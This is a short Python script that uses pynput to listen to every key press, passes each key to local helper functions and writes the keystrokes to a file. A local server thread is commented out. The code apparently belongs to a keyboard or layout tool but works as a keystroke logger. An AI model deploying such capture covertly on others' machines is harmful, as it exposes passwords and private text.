from pynput.keyboard import Listener
import functions as f
import server
import threading
MODE = 'from'

def my_on_press(key):
    key = f.format_key(key)
    # f.print_key_press(key)
    f.save_to_arrays(key)
    f.cleaner()
    f.write_file()

    stop = f.actions_center(MODE)
    if stop:
        listener.stop()

    # print(f.get_keyboard_language())


if __name__ == '__main__':
    # server_thread = threading.Thread(target=server.run)
    # server_thread.daemon = True
    # server_thread.start()

    with Listener(on_press=my_on_press) as listener:
        listener.join()